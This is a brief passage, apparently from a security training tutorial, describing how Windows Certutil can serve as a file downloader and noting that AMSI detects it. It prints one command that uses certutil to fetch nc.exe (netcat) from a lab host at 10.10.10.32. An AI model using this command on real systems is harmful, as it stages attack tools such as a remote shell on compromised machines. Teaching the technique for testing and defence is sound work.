Casey Smith ([@subTee](https://twitter.com/subtee?lang=en)) found that Certutil can be used to download arbitrary files. It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto `wget` for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage.


```cmd-session
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```
